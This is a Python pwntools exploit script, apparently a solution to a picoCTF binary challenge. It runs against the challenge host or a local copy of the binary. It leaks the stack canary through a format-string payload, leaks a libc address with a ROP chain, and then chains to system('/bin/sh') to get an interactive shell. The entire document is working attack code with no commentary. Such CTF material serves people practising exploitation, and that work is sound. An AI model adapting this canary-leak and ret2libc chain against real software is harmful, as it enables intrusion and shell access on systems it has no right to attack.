from pwn import *

host = 'jupiter.challenges.picoctf.org'
port = 57529

local = False 

context.arch = 'i386'
elf = ELF('./vuln')

if local :
	random_num = '-2815'
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	p = elf.process()
else :
	random_num = '-31'
	libc = ELF('./libc6-i386_2.27-3ubuntu1.2_amd64.so')
	p = remote(host, port)
	
p.sendlineafter(b'guess?\n', str.encode(random_num))
payload = b'%135$x'
p.sendlineafter(b'Name? ', payload)

canary = p.recvline().decode('ascii').strip()
canary = int(canary.split()[1], 16)
log.info('Leaked Canary : ' + hex(canary))

p.sendlineafter(b'guess?\n', str.encode(random_num))

func = '__libc_start_main'

ropchain = b'A' * 512
ropchain += p32(canary)
ropchain += b'B' * 12

ropchain += p32(elf.plt['printf'])
ropchain += p32(elf.symbols['win'])
ropchain += p32(elf.got[func])

p.sendlineafter(b'Name? ', ropchain)

p.recvlines(2)
leaked_func = u32(p.recvline()[:4])
log.info(f'Leaked {func} : ' + hex(leaked_func))

libc.address = leaked_func - libc.symbols[func]

ropchain = b'A' * 512
ropchain += p32(canary)
ropchain += b'B' * 12

ropchain += p32(libc.symbols['system'])
ropchain += p32(libc.symbols['exit'])
ropchain += p32(next(libc.search(b'/bin/sh')))

p.sendlineafter(b'Name? ', ropchain)

p.recvlines(2)
p.interactive()